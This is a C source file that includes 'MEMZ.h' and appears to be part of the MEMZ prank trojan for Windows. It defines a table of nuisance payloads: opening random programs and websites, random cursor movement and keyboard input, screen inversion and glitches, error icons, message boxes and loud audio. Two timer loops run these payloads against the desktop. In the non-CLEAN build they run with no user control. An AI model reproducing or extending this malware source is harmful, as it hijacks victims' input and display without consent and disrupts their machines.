#include "../MEMZ.h"

PAYLOAD payloads[] = {
	Payload(L"Open random websites/programs", payloadHostDefault, (LPVOID)payloadExecute, 30000, FALSE), 
	Payload(L"Random cursor movement", payloadHostDefault, (LPVOID)payloadCursor, 20000, TRUE), 
	Payload(L"Random keyboard input", payloadHostDefault, (LPVOID)payloadKeyboard, 20000, FALSE), 
	Payload(L"Random error sounds", payloadHostDefault, (LPVOID)payloadWindowsSounds, 50000, TRUE), 
	Payload(L"Invert Screen", payloadHostVisual, (LPVOID)payloadInvertScreen, 30000, TRUE), 
	Payload(L"Message boxes", payloadHostDefault, (LPVOID)payloadMessageBox, 20000, TRUE), 
	Payload(L"Draw error icons", payloadHostVisual, (LPVOID)payloadDrawErrors, 10000, TRUE), 
	Payload(L"Reverse text", payloadHostDefault, (LPVOID)payloadReverseText, 40000, FALSE), 
	Payload(L"Tunnel effect", payloadHostVisual, (LPVOID)payloadTunnel, 60000, TRUE), 
	Payload(L"Screen glitches", payloadHostVisual, (LPVOID)payloadScreenGlitches, 15000, TRUE), 
	Payload(L"Crazy Bus (Ear Rape)", payloadCrazyBus, NULL, 10000, TRUE), 
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

PAYLOADHOST(payloadHostDefault) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			if (payload->delaytime++ >= payload->delay) {
#ifdef CLEAN
				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
#else
				payload->delay = ((PAYLOADFUNCTIONDEFAULT((*)))payload->payloadFunction)(payload->times++, payload->runtime);
#endif
				
				payload->delaytime = 0;
			}

			payload->runtime++;
#ifdef CLEAN
		} else {
			 payload->runtime = 0;
			 payload->times = 0;
			 payload->delay = 0;
		}
#endif

		Sleep(10);
	}
}

PAYLOADHOST(payloadHostVisual) {
	PAYLOAD *payload = (PAYLOAD*)parameter;

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	int w = rekt.right - rekt.left;
	int h = rekt.bottom - rekt.top;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
#endif
			if (payload->delaytime++ >= payload->delay) {
#ifdef CLEAN
				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, FALSE, hwnd, hdc, &rekt, w, h);
#else
				payload->delay = ((PAYLOADFUNCTIONVISUAL((*)))payload->payloadFunction)(payload->times++, payload->runtime, hwnd, hdc, &rekt, w, h);
#endif
				payload->delaytime = 0;
			}

			payload->runtime++;
#ifdef CLEAN
		}
		else {
			payload->runtime = 0;
			payload->times = 0;
			payload->delay = 0;
		}
#endif

		Sleep(10);
	}
}